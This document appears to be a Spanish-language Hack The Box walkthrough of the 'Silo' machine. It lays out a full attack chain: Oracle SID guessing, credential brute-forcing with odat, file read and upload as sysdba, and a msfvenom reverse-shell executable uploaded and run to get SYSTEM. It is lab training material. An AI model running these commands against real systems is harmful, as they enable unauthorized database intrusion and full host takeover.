@@ -1,0 +1,75 @@
+[*] Maquina Silo
+[*] Aprendemos a explotar el protocolo 1521 Oracle_Tns 
+
+[*] Deberemos de instalar una herramienta llamada odat para obtener todo tipo de datos para conseguir ejecucion remota de comandos.
+
+  ~$> git clone https://github.com/quentinhardy/odat
+
+[*] Despues de esto, tendremos que ejecutar odat.py
+
+  ~$> python3 odat.py --help
+
+
+[*] Primero deberemos de conseguir el SID, asi que deberemos de intentar adivinarlo
+
+  ~$> python3 odat.py sidguesser -s 10.10.10.82
+
+  [+] Output:
+
+    [1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
+    [+] 'XE' is a valid SID. Continue...            ######################################################################################################################################### 
+
+[*] Vemos que el SID XE es valido, ahora deberemos de adivinar la password. Pero antes tendremos que determinar una wordlist para usar en el bruteforce
+
+  ~$> ls -la /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
+
+[*] Tendremos que poner barras entre usuarios y passwords, ya que el programa necesita que le pasemos asi las credenciales.
+
+  ~$> cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/' > userpass.txt
+
+[*] Ahora empezaremos a hacer la fuerza bruta
+
+  ~$> python3 odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file userpass.txt
+
+  [+] Output:
+
+    [+] 'scott/tiger. Valid'
+
+[*] Ahora intentaremos obtener un archivo de el sistema.
+
+  ~$> python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --getFile "C:\\Windows\\System32\\drivers\\etc\\" hosts hosts
+
+  [!] Output:
+    [1] (10.10.10.82:1521): Read the hosts file stored in C:\Windows\System32\drivers\etc\ on the 10.10.10.82 server
+    [-] Impossible to read the ['C:\\Windows\\System32\\drivers\\etc\\', 'hosts', 'hosts'] file: `ORA-01031: insufficient privileges`
+
+[*] Veremos que no tenemos los suficientes permisos para obtener el hosts, para ello en el odat.py si le metemos al final un --help, nos saldra dos opciones para lanzar en el cual se nos conectara co    como sysdba o sysoper, asi que le meteremos al final el siguiente parametro.
+
+  ~$> python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --getFile "C:\\Windows\\System32\\drivers\\etc\\" hosts hosts --sysdba
+  
+  [+] Output:
+
+    [1] (10.10.10.82:1521): Read the hosts file stored in C:\Windows\System32\drivers\etc\ on the 10.10.10.82 server
+    [+] Data stored in the hosts file sored in C:\Windows\System32\drivers\etc\ (copied in hosts locally):
+    b"# Copyright (c) 1993-2009 Microsoft Corp.\n#\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n#\n# This file contains the mappings of IP addresses to host names. Each\n# entry should be kept on an individual line. The IP address should\n# be placed in the first column followed by the corresponding host name.\n# The IP address and the host name should be separated by at least one\n# space.\n#\n# Additionally, comments (such as these) may be inserted on individual\n# lines or following the machine name denoted by a '#' symbol.\n#\n# For example:\n#\n#      102.54.94.97     rhino.acme.com          # source server\n#       38.25.63.10     x.acme.com              # x client host\n\n# localhost name resolution is handled within DNS itself.\n#\t127.0.0.1       localhost\n#\t::1
+
+  [!] En el caso de que no funcione usa --sysoper
+
+[*] Ahora tendremos que crear un .exe para poder subirlo a la maquina y ejecutarlo  
+
+  ~$> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.57 LPORT=443 -f exe -o shell.exe
+
+[*] Subimos el archivo shell.exe
+
+  [*] Lo subimos al C:\Windows\Temp\
+  ~$> python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --putFile /Windows/Temp shell.exe shell.exe --sysdba
+
+  [+] Output:
+    [1] (10.10.10.82:1521): Put the shell.exe local file in the /Windows/Temp folder like shell.exe on the 10.10.10.82 server
+    [+] The shell.exe file was created on the /Windows/Temp directory on the 10.10.10.82 server like the shell.exe file
+
+[*] Ejecutaremos el shell.exe y nos pondremos por escucha para obtener la reverse shell
+  
+  ~$> python3 odat.py externaltable -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --exec /Windows/Temp shell.exe --sysdba
+  
+  [+] Despues de esto, al estar en escucha por el puerto 443, tendremos una reverse shell como nt authority\system
